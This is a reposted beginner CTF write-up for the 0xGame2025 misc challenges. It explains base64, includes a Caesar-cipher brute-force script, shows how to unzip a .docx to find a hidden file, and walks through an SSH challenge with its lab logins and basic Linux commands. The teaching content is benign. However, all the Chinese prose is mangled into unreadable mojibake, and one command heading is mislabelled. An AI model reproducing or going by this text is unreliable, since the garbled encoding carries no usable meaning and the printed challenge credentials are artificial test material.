---
title: 0xgame2025misc
link: 0xgame2025misc
date: 2026-02-11 13:45:36
description: 0xgame2025çš„miscå‡ ä¹éƒ½æ˜¯æˆ‘å‡ºçš„ï¼Œè¿™é‡Œè®°å½•ä¸€äº›èµ›é¢˜è¯¦ç»†é¢˜è§£
tags:
  - 0xgame2025
  - misc
categories:
  - CTF
cover: /img/cover/game.png
---

# 0xGame2025 misc èµ›é¢˜è§£æ

> 0xGame2025 CTF Misc èµ›é“å‡ºé¢˜è§£æä¸æ•™å­¦æŒ‡å—\
> ä½œè€…ï¼šYo1o\
> <https://xz.aliyun.com/news/19232>\
> æ–‡ç« è½¬è½½è‡ª å…ˆçŸ¥ç¤¾åŒº

æˆ‘æ˜¯ 0xGame2025 çš„éƒ¨åˆ† Misc çš„å‡ºé¢˜äººï¼Œä¸‹é¢æ˜¯é’ˆå¯¹ misc æ–¹å‘çš„æˆè¯¾æ–‡æ¡ˆï¼Œå¸Œæœ›èƒ½å¸®åŠ©åˆšè¸ä¸Š ctf è·¯ä¸Šçš„å­¦å¼Ÿå­¦å¦¹ä»¬å¿«é€Ÿå…¥é—¨

> 0xgame2025 æ‰€æœ‰é¢˜ç›®å½’æ¡£ä¼ é€é—¨å¦‚ä¸‹

* [0xGame2025Week1](https://www.ctfplus.cn/learning/problem/excellent-problemSet/detail/1975497062459904000)

* [0xGame2025Week2](https://www.ctfplus.cn/learning/problem/excellent-problemSet/detail/1978130369429377024)

* [0xGame2025Week3](https://www.ctfplus.cn/learning/problem/excellent-problemSet/detail/1980644777888059392)

* [0xGame2025Week4](https://www.ctfplus.cn/learning/problem/excellent-problemSet/detail/1983791961533845504)

## Week1

### Sign_in

é¢˜ç›®åªç»™æˆ‘ä»¬ä¸€ä¸²ç¼–ç ï¼Œé‡åˆ°è¿™ç±»é¢˜ï¼Œå°±æŠŠå®ƒå¤åˆ¶åˆ°`cyberchef`è¿™ç±»è‡ªåŠ¨åŒ–è§£å¯†[å·¥å…·](https://cyberchef.org/)ï¼ˆæˆ‘ä»¬ç»å¸¸ç®¡å®ƒå«èµ›åšå¨å­ï¼‰ä¸­ï¼Œå·¥å…·ä¼šå¸®æˆ‘ä»¬æ£€æµ‹å‡ºç¼–ç ç±»å‹

ps:æˆ‘ä»¬åœ¨é£ä¹¦ä¸Šæœ‰å‡†å¤‡`cyberchef`çš„ç¦»çº¿ç‰ˆæœ¬ï¼Œä¸‹è½½è§£å‹åç‚¹å‡»é‚£ä¸ª html æ–‡ä»¶å°±èƒ½ç”¨

> è¿™é‡Œå¸Œæœ›å­¦å¼Ÿå­¦å¦¹ä»¬èƒ½çœ‹åˆ°ä¸€ç§é™Œç”Ÿçš„ç¼–ç å°±è¿›è¡Œç®€å•çš„å­¦ä¹ ï¼Œä¸‡å˜ä¸ç¦»å…¶å®—ï¼Œåªè¦æŒæ¡å…¶ä¸­å‡ ç§ç¼–ç åŸç†ï¼Œå…¶ä»–çš„ç¼–ç æ–¹å¼ä¹Ÿå°±èƒ½å¿«é€Ÿä¸Šæ‰‹äº†

ç®€å•è¯´è¯´å·¥å…·çš„ä½¿ç”¨ï¼Œè¯·æ³¨æ„ï¼Œå¦‚æœè¿™é‡Œ output å³ä¾§å‡ºç°é­”æ³•æ£’ï¼Œå°±è¯´æ˜ï¼Œå·¥å…·å·²ç»æ£€æµ‹å‡ºå­—ç¬¦ä¸²çš„å¯èƒ½ç¼–ç æ–¹å¼ï¼Œç‚¹å‡»å³å¯

{% note color:red éœ€è¦æ³¨æ„ï¼Œè¯¥å·¥å…·ä¹Ÿæœ‰å¯èƒ½è¯¯åˆ¤ï¼Œå¦‚æœè¯´è§£å¯†å‡ºæ¥çš„ä¸œè¥¿ä¸å¯è¯»æˆ–è€…æ˜¯åˆ«çš„é”™è¯¯æƒ…å†µï¼Œè¯·åŠæ—¶çš„é€‰æ‹©å…¶ä»–æ³•å­ %}

Recipe ä¸­å‡ºç° From base64ï¼ŒåŒæ—¶ output ä¹Ÿå¤§å˜æ ·ï¼Œå½¢å¼ä¸Šå¾ˆåƒæˆ‘ä»¬è¦æäº¤çš„ flag

è¿™é‡Œå…ˆè®²è§£æ¸…æ¥š Base64 ç¼–ç åŸç†

#### base64 ç¼–ç åŸç†

Base64 ç¼–ç æ˜¯ä½¿ç”¨èŒƒå›´ç‰¹åˆ«å¹¿çš„ä¸€ç§ç¼–ç æ–¹å¼ï¼Œä¸ç®¡æ˜¯å›¾ç‰‡ï¼Œæ–‡å­—ï¼ŒéŸ³é¢‘ç­‰å„ç±»æ–‡ä»¶ï¼Œéƒ½å¯ä»¥é€šè¿‡ base64 ç¼–ç å¤„ç†ï¼Œä¾¿æºå‘é€åˆ°ç½‘ä¸Šè¿›è¡Œä¼ è¾“

æ­£å¸¸çš„ Base64 ç¼–ç ç”¨åˆ°çš„å­—ç¬¦é›†æ˜¯ï¼ˆA-Z, a-z, 0-9, +, /ï¼‰å…± 64 ä¸ªå­—ç¬¦ï¼Œä½†æ˜¯æ³¨æ„ï¼Œ'A'åœ¨å­—ç¬¦é›†çš„ç´¢å¼•å€¼æ˜¯ 0ï¼Œ'/'çš„ç´¢å¼•å€¼æ˜¯ 63ï¼Œä¸­é—´çš„å°±æŒ‰ç…§é¡ºåºè¿›è¡Œé€’å¢

ç¼–ç åŸç†å¦‚ä¸‹ï¼Œå…ˆå°†ä¼ è¾“çš„ä¿¡æ¯è½¬æ¢æˆäºŒè¿›åˆ¶ï¼Œç„¶åè¿™é‡Œçš„äºŒè¿›åˆ¶ä¸²éƒ½æ˜¯ 8 ä½çš„ï¼Œæ¥ä¸‹æ¥ 8 ä½å˜ 6 ä½ï¼Œ3 ä¸ªå­—æ¯æ‹† 4 ç»„ï¼Œæ¥ç€ 6 ä½äºŒè¿›åˆ¶å˜åè¿›åˆ¶ï¼Œç„¶åæŒ‰ç…§åè¿›åˆ¶åœ¨ Base64 å­—ç¬¦é›†ä¸­è¿›è¡Œç´¢å¼•ï¼Œä¸Šé¢è¯´çš„ 3 ä¸ªå­—æ¯æ‹† 4 ç»„ï¼Œå¦‚æœè¯´æ‹†çš„æ—¶å€™ä¸å¤Ÿæ‹†äº†ï¼Œè¦ç”¨ 0 å¡«å……ï¼Œä½†æ˜¯å…¨æ˜¯ 0 çš„é‚£ç»„ä¸‹é¢è½¬æ¢ç´¢å¼•å€¼åï¼Œç”¨=å·å¡«å……

ä¸‹é¢æ˜¯å°†æ˜æ–‡ flag è½¬æ¢æˆ base64 ç¼–ç çš„åŸç†ç¤ºæ„å›¾

{% note color:green è¿™é‡Œæœ‰ä¸ªå°ç»“è®ºï¼Œé‡åˆ°`Zmxh`åˆ«è¿Ÿç–‘ï¼Œè¯´ä¸å®šå°±æ˜¯ flag çš„ base64 ç¼–ç å‘¢ï¼Ÿè¿˜æœ‰æ˜‚ï¼Œè¿™é‡Œæˆ‘ä¸€ç›´è¯´çš„æ˜¯ç¼–ç è€Œä¸æ˜¯åŠ å¯†ï¼Œæ‰€ä»¥æ³¨æ„ä¸€ä¸ªå°ç»†èŠ‚ï¼Œä»¥åä¸è¦è¯´ base64 åŠ å¯† %}

#### å‡¯æ’’å¯†ç åŸç†

æ¥ä¸‹æ¥æ‹¿åˆ°å¾ˆåƒ flag çš„å­—ç¬¦ä¸²

```text
0hQkwo{Govm0wo_d0_0hQ4w3_2y25_@xn_r@mu_Pyb_peX}
0xGame{xxx}   #è¿™ä¸€è¡Œç»™ä½ ä»¬æ¯”å¯¹çš„
```

åˆ·é¢˜æ•°é‡è¶³å¤Ÿå¤šçš„è¯ï¼Œèƒ½å¿«é€Ÿè®¤è¯†åˆ°ï¼Œè¿™ä¸ªæ˜¯å‡¯æ’’å¯†ç è¿™ç±»çš„ç®€å•ç§»ä½æ›¿æ¢å¯†ç (ä»”ç»†è§‚å¯Ÿçš„è¯ï¼Œä¼šå‘ç°é¦–å­—æ¯çš„æ•°å­—æ²¡å˜ï¼Œç¬¦å·æ²¡å˜ï¼ŒåŸºæœ¬ä¸Šå°±èƒ½å¾€è¿™é‡ŒçŒœæµ‹äº†

åŠ å¯†åŸç†å°±æ˜¯å°†æ˜æ–‡ä¸­çš„æ¯ä¸ªå­—æ¯æŒ‰ç…§å­—æ¯è¡¨é¡ºåº**å‘åï¼ˆæˆ–å‘å‰ï¼‰ç§»åŠ¨å›ºå®šçš„ä½ç½®**ï¼Œå¾—åˆ°å¯†æ–‡ã€‚

> åŠ è§£å¯†å…¬å¼

* **åŠ å¯†**ï¼š`å¯†æ–‡å­—æ¯ = (æ˜æ–‡å­—æ¯ä½ç½® + åç§»é‡) mod 26`

* **è§£å¯†**ï¼š`æ˜æ–‡å­—æ¯ = (å¯†æ–‡å­—æ¯ä½ç½® - åç§»é‡ + 26) mod 26`

æ‰€ä»¥è¯´åªè¦çŸ¥é“å¯†æ–‡å­—æ¯è¿˜æœ‰**shift**ï¼ˆåç§»é‡ï¼‰å°±èƒ½å¿«é€Ÿé”å®šæ˜æ–‡å­—æ¯

éœ€è¦æ³¨æ„çš„åœ°æ–¹å¦‚ä¸‹ï¼š

å‡¯æ’’å¯†ç è¿›è¡Œæ›¿æ¢çš„æ—¶å€™ï¼Œåº”è¯¥å…ˆæ£€æµ‹æ˜æ–‡æ˜¯å¤§å†™è¿˜æ˜¯å°å†™

å¤§å†™å­—æ¯èŒƒå›´ï¼š`A(65)åˆ°Z(90)`

å°å†™å­—æ¯èŒƒå›´ï¼š`a(97)åˆ°z(122)`

ç”±äºè¿™é‡Œçš„å‡¯æ’’åç§»æŒ‡å®šåœ¨å¯¹åº”çš„å¤§å°å†™å­—æ¯è¡¨ä¸­ï¼Œæ‰€ä»¥æˆ‘ä»¬çš„èŒƒå›´åªæœ‰ 0-25 çš„ç´¢å¼•å€¼ï¼Œå°±æ˜¯è¯´ï¼Œå¦‚æœæ˜æ–‡æ˜¯å¤§å†™ï¼Œæˆ‘ä»¬åº”è¯¥å‡å» 65ï¼Œç”¨å¾—åˆ°çš„ç»“æœè¿›è¡Œåç§»ï¼Œç„¶åè¿›è¡Œ 26 å–ä½™ç¡®ä¿ç»“æœä¾ç„¶åœ¨å­—æ¯è¡¨ä¸­ï¼Œç„¶åå†+65 å›åˆ°å¤§å†™å­—æ¯ä¸­ï¼Œå°å†™å­—æ¯çš„è§£å¯†æ“ä½œæ˜¯åŒæ ·çš„åŸç†

ä¸è¿‡é—®é¢˜æ¥äº†ï¼Œæˆ‘ä»¬è¿™é‡Œå¹¶ä¸çŸ¥é“ shiftï¼Œå¥½åœ¨ç´¢å¼•å€¼ä¸º 0-25ï¼Œå°± 26 ä¸ªé€‰é¡¹ï¼Œå¯ä»¥é€‰æ‹©çˆ†ç ´ï¼Œæœ€åçš„ç»“æœå°±æ˜¯çˆ†ç ´åˆ°ç¬¬ 26 æ¬¡ï¼Œç†è®ºä¾æ®å°±æ˜¯æˆ‘ä¸Šé¢è¯´çš„ï¼ŒåŠ ä¸Š shift åï¼Œæˆ‘ä»¬ä¼šå¯¹ç»“æœè¿›è¡Œ 26 å–ä½™ï¼Œè®©æœ€ç»ˆå¾—åˆ°çš„åç§»å€¼ä¸ä¼šè¶…è¿‡ 26

è¿™é‡Œè¿˜æ˜¯å»ºè®®è‡ªå·±æ‰‹æ“å‡¯æ’’çˆ†ç ´è§£å¯†è„šæœ¬

> ä»€ä¹ˆï¼Ÿï¼ä½ ä»£ç ä¹Ÿå†™ä¸å¥½ï¼Ÿå¥³å­©å­è¯·æ‰¾æˆ‘ï¼Œæˆ‘æ¥æ•™ä½ å†™ï¼›ç”·å­©å­ä¹Ÿå¯ä»¥æ¥æ‰¾æˆ‘ï¼Œæˆ‘å¯ä»¥è€ƒè™‘ç»™ä½ æ¢†æ¢†ä¸€æ‹³

```python
def exp(str,shift):
    result=""
    for char in str:
        if char.isupper():
            result+=chr((ord(char)-65-shift)%26+65)
        elif char.islower():
            result+=chr((ord(char)-97-shift)%26+97)
        else:
            result+=char

    return result
def solver(str):
    for i in range(26):
        a=exp(str,i)
        if a.startswith("0xGame"):
            print(a)
            break

if __name__=="__main__":
    solver("0hQkwo{Govm0wo_d0_0hQ4w3_2y25_@xn_r@mu_Pyb_peX}")
#0xGame{Welc0me_t0_0xG4m3_2o25_@nd_h@ck_For_fuN}
```

### å…¬ä¼—å·åŸç¨¿

é¦–å…ˆè¦çŸ¥é“ä¸€äº›å‰ç½®çŸ¥è¯†

`.docx`æ–‡ä»¶çš„æœ¬è´¨å°±æ˜¯ zip å‹ç¼©åŒ…ï¼Œä¸æ­¤ç±»ä¼¼çš„å¯è¯»çš„æ–‡æ¡£ï¼ˆå‹ç¼©åŒ…ï¼‰æ ¼å¼æœ‰.xlsx å’Œ.pptx

è¿™æ˜¯å¾®è½¯ä» office 2007 å¼€å§‹å¼•å…¥çš„æ–°çš„é»˜è®¤æ ¼å¼ï¼Œéµå¾ªä¸€ä¸ªåä¸ºâ€œ**å¼€æ”¾æ‰“åŒ…çº¦å®š**â€(Open Packaging Conventions,ç®€ç§° OPC)ã€‚

åœ¨è¿™ä¸ªçº¦å®šä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥å°†ä¸€ä¸ª`.docx`æ–‡ä»¶çœ‹æˆâ€œæŠ«ç€ Word å¤–è¡£çš„ ZIP å‹ç¼©åŒ…â€

å…³äºçº¦å®šæ ¼å¼ä¸Šçš„ç»†èŠ‚ï¼Œå¤§å®¶å¯ä»¥è‡ªå·±ç ”ç©¶ä¸‹ï¼Œåªéœ€è¦çŸ¥é“ï¼Œä¸‹æ¬¡é‡åˆ°è¿™ç±»é¢˜åï¼Œå¯ä»¥å°è¯•å°†åç¼€åæ”¹æˆ zipï¼Œè§£å‹çœ‹çœ‹æœ‰æ²¡æœ‰ä»€ä¹ˆç‰¹æ®Šçš„æ–‡ä»¶åœ¨é‡Œé¢

```bash
[Content_Types].xml
_rels/
docProps/
    app.xml
    core.xml
word/
    document.xml      <-- è¿™é‡Œå­˜æ”¾æ–‡æ¡£çš„ä¸»è¦æ–‡å­—å†…å®¹
    styles.xml        <-- è¿™é‡Œå­˜æ”¾æ ·å¼ä¿¡æ¯
    media/
        image1.png    <-- ä½ æ’å…¥çš„å›¾ç‰‡å°±åœ¨è¿™é‡Œ
    theme/
    _rels/
    ...
```

ä¸€èˆ¬æ¥è¯´ï¼Œè§£å‹**.docx**æ–‡ä»¶åï¼Œå®ƒçš„æ–‡ä»¶ç›®å½•å¦‚ä¸Š

æœ¬é¢˜ä¸­ï¼Œä½ ä»¬è§£å‹åä¼šåœ¨`docProps/`ç›®å½•ä¸‹çœ‹åˆ° gift.xmlï¼Œè€Œè¿™å°±æ˜¯æˆ‘ä¸ºä½ ä»¬å‡†å¤‡çš„ flag

### ez_shell

> æ³¨æ„ï¼šæœ¬é¢˜æ˜¯ SSH å®¹å™¨è¿æ¥é¢˜ç›®\
> æœ¬é¢˜æ˜¯ä¸€é“å¸®åŠ©æ–°ç”Ÿæ¥è§¦ Linux å‘½ä»¤çš„å¼•å¯¼é¢˜ï¼Œå…¶ä»–ä½¬å¯ä»¥è·³è¿‡ä¸‹é¢çš„å¼•å¯¼éƒ¨åˆ†ï¼Œéœ€è¦æäº¤çš„ flag ç»„æˆå¦‚ä¸‹ï¼š\
> ä¸Šè¿°ç»“æœéœ€è¦ç”¨'_'è¿æ¥ï¼Œç„¶åç”¨ 0xGame{}åŒ…è£¹ï¼Œæœ€ç»ˆ flag æ ·ä¾‹ï¼š`0xGame{who_pwd_xxx_xxx_xxx}`\
> ä¼šç”¨åˆ°çš„ä¿¡æ¯ï¼š\
> \
> \
> `whoami`å‘½ä»¤çš„ç»“æœ\
> `pwd`å‘½ä»¤çš„ç»“æœ\
> å½“å‰è·¯å¾„ä¸‹çš„æ–‡ä»¶å¤¹åï¼ˆé™¤å»ä¸Šçº§è·¯å¾„å’Œå½“å‰è·¯å¾„ç¬¦å·\
> è¯¥æ–‡ä»¶å¤¹ä¸‹é¢çš„ flag1.txt æ–‡ä»¶å†…å®¹\
> `/root`ä¸‹çš„ flag2.txt æ–‡ä»¶å†…å®¹\
> \
> \
> \
> \
> **ssh**è¿æ¥ï¼š`hacker/h@cker_it`\
> **root**ç”¨æˆ·ï¼š`root/Y0u_@re_root`

***

å¦‚ä½•å¦‚ä½•ğŸ‘€ï¼Ÿ

æ˜¯ç¬¬ä¸€æ¬¡æ¥è§¦ shell å—ï¼Œè§£å†³ä¸äº†çš„è¯ï¼Œæˆ‘æ¥æ•™ä½ ,è¿™é‡Œæœ‰ä¸ª[Linux å‘½ä»¤å¤§å…¨](https://www.linuxcool.com/)ï¼Œå…ˆæ”¾è¿™ï¼ŒçŒœä½ ä¸ä¼šä»”ç»†çœ‹ï¼Œå¥½å¥½çœ‹çœ‹æˆ‘ä¸‹é¢çš„å¼•å¯¼æ­¥éª¤å§ï¼Œæ•²é»‘æ¿æ˜‚ï¼ï¼ï¼

#### å¼•å¯¼

> ä¹Ÿè®¸æˆ‘æœ‰æ²¡è¯´æ˜ç™½çš„ç‚¹ï¼Œå¯ä»¥éšæ—¶æ‰¾æˆ‘ï¼Œæˆ–è€…è‡ªè¡Œç ”ç©¶è§£å†³

é‡åˆ°è¿™æ ·çš„`tcp`å®¹å™¨é¢˜ç›®ï¼Œéœ€å¼€å¯å®¹å™¨ï¼Œä¼šå¾—åˆ°ç±»ä¼¼è¿™æ ·çš„å†…å®¹`nc1.ctfplus.cn 34857`

å‰é¢éƒ¨åˆ†å¯ä»¥æ˜¯ IP åœ°å€ä¹Ÿå¯ä»¥æ˜¯åŸŸåï¼Œåé¢çš„æ•°å­—æ˜¯ç«¯å£å·ï¼Œæ³¨æ„ï¼Œä¸­é—´æ˜¯ç©ºå¼€çš„ï¼Œå’Œ http çš„':'è¿æ¥æœ‰æ‰€å·®å¼‚

å¸¸è§çš„ tcp æœåŠ¡æ˜¯ä½¿ç”¨**netcat**è¿™æ ·çš„å·¥å…·è¿›è¡Œ nc è¿æ¥çš„ï¼Œä½†æ˜¯é¢˜ç›®æè¿°ä¸­ï¼Œè¯´åˆ°äº†ï¼Œè¿™ä¸ªæ˜¯ ssh å®¹å™¨é¢˜ç›®ï¼Œè€Œä¸”ç»™å‡ºäº†è¿æ¥è´¦å¯†ï¼Œéœ€è¦æˆ‘ä»¬é€šè¿‡ ssh è¿›è¡Œè¿œç¨‹è¿æ¥

***

* step1 è¿›å…¥ shell

åœ¨ç»ˆç«¯ä¸­è¾“å…¥:

```bash
ssh hacker@nc1.ctfplus.cn -p 34857
```

`tips:powershell,cmd,linuxç»ˆç«¯ç­‰éƒ½å¯ä»¥æ»´`

ä¸€èˆ¬æ¥è¯´ï¼Œssh æœåŠ¡æ˜¯ç”¨é»˜è®¤ç«¯å£ 22 è¿æ¥çš„ï¼Œå°±æ˜¯è¯´åœ¨å¹³æ—¶è¿æ¥é¶æœºçš„æ—¶å€™å¯ä»¥ä¸ç”¨-p æŒ‡å®šç«¯å£ï¼Œè€Œè¿™é‡Œæ˜¯ç”±äº docker å®¹å™¨è¿›è¡Œäº†ç«¯å£è½¬å‘æ‰éœ€è¦æˆ‘ä»¬æŒ‡å®šå¯¹åº”çš„ç«¯å£å·è¿›è¡Œè¿æ¥

ä¸Šé¢çœ‹ä¸æ‡‚é—®é¢˜ä¸å¤§ï¼Œéœ€è¦æ¸…æ¥šä¸€ç‚¹ï¼Œè¿æ¥ ssh éœ€è¦æŒ‡å®šé¶æœºä¸Šæœ‰è¿œç¨‹è¿æ¥æƒé™çš„ç”¨æˆ·ï¼Œæ¯”æ–¹è¯´æœ¬é¢˜ä¸­ï¼Œåªæœ‰ hacker ç”¨æˆ·èƒ½ ssh è¿æ¥ï¼Œroot ä¸å¯ä»¥

```bash
ssh hacker@nc1.ctfplus.cn -p 34857
The authenticity of host '[nc1.ctfplus.cn]:34857 ([103.85.86.154]:34857)' can't be established.
ED25519 key fingerprint is SHA256:heNboAPQQACbtUAWuJK45JXDMmx2YFFmYkGyVhd17e0.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[nc1.ctfplus.cn]:34857' (ED25519) to the list of known hosts.
hacker@nc1.ctfplus.cn's password:
Welcome to Alpine!

The Alpine Wiki contains a large amount of how-to guides and general
information about administrating Alpine systems.
See <https://wiki.alpinelinux.org/>.

You can setup the system with the command: setup-alpine

You may change this message by editing /etc/motd.

dep-428f3ef5-705a-4364-a5ee-e59fc8e1fc00-5d4c55ff4b-gpflw:~$
```

å›è½¦è¿è¡Œå‘½ä»¤åä¼šå‡ºç°ä¸€å¤§æ®µå®‰å…¨éªŒè¯çš„ä¿¡æ¯ï¼Œä¸ç”¨ç®¡ï¼Œå¤§è‡´æ„æ€æ˜¯è¯´æœ¬ç”µè„‘ç¬¬ä¸€æ¬¡è¿æ¥è¯¥æœåŠ¡å™¨ï¼Œä¸»æœºåˆ—è¡¨ä¸­æ‰¾ä¸åˆ°å¯¹åº”çš„èº«ä»½è®°å½•ï¼Œç„¶åè¾“å‡ºäº†æœåŠ¡å™¨çš„å…¬é’¥æŒ‡çº¹ï¼Œç”¨æ¥éªŒè¯æœåŠ¡å™¨èº«ä»½çš„ï¼Œè¿™ä¸ªæ—¶å€™ï¼Œæˆ‘ä»¬éœ€è¦è¾“å…¥`yes`æ¥åŒæ„è¿æ¥ï¼Œç„¶åæœåŠ¡å™¨å…¬é’¥ä¼šä¿å­˜åœ¨æœ¬åœ°~/.ssh/known_hosts æ–‡ä»¶ä¸­ï¼Œä¸‹æ¬¡è¿æ¥çš„æ—¶å€™å°±ä¸ä¼šè§¦å‘è­¦å‘Š

æ¥ä¸‹æ¥æ˜¯è¾“å…¥å¯†ç `h@cker_it`ï¼Œè¿™é‡Œä½ ä»¬ä¼šä¸ä¼šå› ä¸ºçœ‹ä¸åˆ°è¾“å…¥çš„å†…å®¹è¯¯ä»¥ä¸ºæœºå™¨å‡ºé—®é¢˜äº†ï¼ŸO(âˆ©_âˆ©)O

è¿™æ˜¯ Linux ç³»ç»Ÿå‡ºäºå®‰å…¨è€ƒè™‘çš„è®¾è®¡ï¼Œä¸ºäº†é˜²æ­¢æ—è§‚è€…åœ¨æˆ‘ä»¬è¾“å…¥å¯†ç æ—¶çœ‹åˆ°ä»»ä½•è§†è§‰åé¦ˆï¼ˆåŒ…æ‹¬æ˜Ÿå·ã€åœ†ç‚¹ç­‰ï¼‰ä½†æ˜¯æˆ‘ä»¬çš„æ¯ä¸€æ¬¡è¾“å…¥éƒ½æ˜¯è¢«æ­£å¸¸è®°å½•çš„ï¼Œæ‰€ä»¥ä¸€å®šè¦æ³¨æ„ä¸è¦æ‰“é”™å­—å“¦ï¼Œå¤åˆ¶è¿›å»ä¹Ÿæ˜¯å¯ä»¥çš„ï¼ˆè¿™ä¸ªè®¾è®¡ç†Ÿæ‚‰å°±å¥½ï¼Œå‡ ä¹æ‰€æœ‰ Linux ç³»ç»Ÿéƒ½æ˜¯è¿™æ ·çš„ï¼Œå°±å¥½æ¯”æ‰‹æœºæŸç½‘ç«™çš„ç™»å½•é¡µé¢ï¼Œè¾“å…¥å¯†ç å…¨ç”¨"Â·"è¿›è¡Œæ›¿ä»£

ç™»å½•åçœ‹åˆ°ç±»ä¼¼`hostname:~$` çš„å­—æ ·ï¼Œå°±è¡¨ç¤ºæˆ‘ä»¬ç™»å½•æˆåŠŸï¼Œé‚£ä¹ˆæ­å–œä½ ç¬¬ä¸€æ¬¡è¿›å…¥ shell æˆåŠŸäº†ğŸ¥³ğŸ¥³ğŸ¥³

* step2 å¼€å§‹ç­”é¢˜

æ‰€æœ‰ Linux çš„åŸºç¡€å‘½ä»¤éƒ½ä¸€æ ·çš„ï¼Œè¯¦ç»†ä»‹ç»è¿˜æ˜¯è¯·çœ‹æˆ‘ä¸Šé¢æ”¾ç½®çš„ç½‘é¡µé“¾æ¥,ä¸‹é¢ä»…ä»…è®²è¿°é¢˜ç›®ä¸­è¦ç”¨åˆ°çš„å‘½ä»¤ï¼Œä¹Ÿæ˜¯æˆ‘ä»¬ç»å¸¸ç”¨çš„

-- whoami

å¾ˆæ˜¾ç„¶ï¼Œæ˜¯ who am iï¼ˆæˆ‘æ˜¯è°ï¼‰ï¼Œç”¨é€”æ˜¯æ˜¾ç¤ºå½“å‰ç”¨æˆ·å

```bash
yolo@yolo:~$ whoami
yolo
```

-- pwd

print working directoryï¼ŒåŠŸèƒ½æ˜¯æ˜¾ç¤ºå½“å‰å·¥ä½œç›®å½•çš„ç»å¯¹è·¯å¾„

```bash
yolo@yolo:~$ pwd
/home/yolo
```

-- ls

çœŸæ˜¯æœ€æœ€å¸¸ç”¨çš„å‘½ä»¤ï¼Œç”¨é€”æ˜¯åˆ—å‡ºå½“å‰è·¯å¾„ä¸‹çš„æ–‡ä»¶åŠå…¶å±æ€§ä¿¡æ¯ï¼Œä½†æ˜¯ç»å¸¸è¦ç»“åˆå‚æ•°ä½¿ç”¨

```plain
yolo@yolo:~$ ls
yolo@yolo:~$ ls -la
total 12
drwxr-xr-x  3 yolo yolo 4096 Sep 26 17:58 .
drwxr-xr-x 11 yolo yolo 4096 Sep 26 17:56 ..
drwxr-xr-x  2 yolo yolo 4096 Sep 26 17:58 .secret
```

ç¬¬ä¸€ä¸ª ls ä¼šå•çº¯åˆ—å‡ºæ­£å¸¸æ— éšè—çš„æ–‡ä»¶åæˆ–æ–‡ä»¶å¤¹åï¼Œåœ¨ Linux ä¸­ï¼Œåƒ.xxx è¿™æ ·çš„ï¼Œåå­—å‰é¢æ˜¯'.'çš„æ–‡ä»¶æˆ–æ–‡ä»¶å¤¹ä¼šè¢«ç³»ç»Ÿé»˜è®¤éšè—ï¼Œéœ€è¦ä½¿ç”¨-a æ˜¾ç¤ºæ‰€æœ‰æ–‡ä»¶ï¼ŒåŒ…æ‹¬éšè—çš„ï¼›-l ä¼šåˆ—å‡ºæ–‡ä»¶çš„å±æ€§ï¼ŒåŒ…æ‹¬æ–‡ä»¶ç±»å‹ã€æƒé™ã€ç¼–è¾‘æ—¶é—´ã€æ‰€æœ‰è€…ç­‰ç­‰

> è¿™é‡Œçš„.ä»£è¡¨çš„æ˜¯å½“å‰ç›®å½•ï¼Œæ˜¯ä¸€ç§ç›¸å¯¹è·¯å¾„ï¼Œ..ä»£è¡¨çš„æ˜¯ä¸Šä¸€çº§è·¯å¾„ï¼Œå‰é¢çš„**drwxr-xr-x**äº¤ç»™ä½ ä»¬è‡ªå·±ç ”ç©¶

-- pwd

æœ¬å‘½ä»¤å¯ä»¥æ”¹å˜å½“å‰è·¯å¾„ï¼Œå’Œæˆ‘ä»¬åœ¨ Windows æ¡Œé¢åŒç‚¹æŸæ–‡ä»¶å¤¹è¿›å»çœ‹é‡Œé¢çš„å†…å®¹çš„æ“ä½œç±»ä¼¼

```plain
yolo@yolo:~$ pwd
/home/yolo
yolo@yolo:~$ cd .secret
yolo@yolo:~/.secret$ pwd
/home/yolo/.secret
```

-- cat

æœ¬å‘½ä»¤å¯ä»¥è¯»å–æŒ‡å®šæ–‡ä»¶çš„å†…å®¹ï¼Œæ­£å¸¸æ¥è¯´ï¼Œæ¨èç”¨ cat è¯»å–é‚£äº›å°ç‚¹çš„ï¼Œçº¯æ–‡æœ¬çš„æ–‡ä»¶ï¼Œæ¯”æ–¹è¯´ flag.txt è¿™æ ·çš„ï¼Œå…¶ä»–æƒ…å†µä¸‹ï¼Œæœ‰å…¶ä»–å‘½ä»¤å¯ä»¥ç”¨ï¼Œæ¯”å¦‚ more,less ç­‰ç­‰ï¼Œè‡ªä¸ªç ”ç©¶æ˜‚

```plain
yolo@yolo:~/Desktop/.secret$ ls
flag1.txt
yolo@yolo:~/Desktop/.secret$ cat flag1.txt
congratulation!
```

-- su root

Linux å¯¹äºæƒé™çš„æ¦‚å¿µå¾ˆä¸¥æ ¼ï¼ˆå½“ç„¶ Windows åŒæ ·ï¼Œåªæ˜¯ä¸å¸¸è§

ä¸€äº›æ–‡ä»¶æˆ–è·¯å¾„ï¼Œéœ€è¦é«˜æƒé™ä¹ƒè‡³ root ç”¨æˆ·æ‰èƒ½è¿›å…¥ï¼Œè¿™ä¸ªæ—¶å€™ï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨ su xxx æŒ‡å®šåˆ‡æ¢ç”¨æˆ·ï¼ŒåŒæ ·éœ€è¦ä½¿ç”¨ç™»å½•å¯†ç 

```plain
yolo@yolo:~/.secret$ cd /root
-bash: cd: /root: Permission denied
yolo@yolo:~/.secret$ su root
Password:
root@yolo:/.secret# cd /root
root@yolo:~# pwd
/root
```

è¿™é‡Œæˆ‘ç»™ç”¨æˆ·åŒæ ·è®¾ç½®äº†ä¸ç”¨å¯†ç çš„ sudo æƒé™ï¼Œå…è®¸ç”¨æˆ· yolo ä¸è¾“å…¥å¯†ç çš„æƒ…å†µä¸‹ç›´æ¥æ‰§è¡Œ root æƒé™å‘½ä»¤

```plain
yolo@yolo:~/.secret$ id
uid=1000(yolo) gid=1000(yolo) groups=1000(yolo)
yolo@yolo:~/.secret$ sudo su
root@yolo:/home/yolo/.secret# id
uid=0(root) gid=0(root) groups=0(root)
root@yolo:/home/yolo/.secret# cd /root
root@yolo:~# cat flag2.txt
hacker!
```

* step3 åˆæˆ flag

```plain
0xGame{yolo_/home/yolo_.secret_congratulation!_hacker!}
```

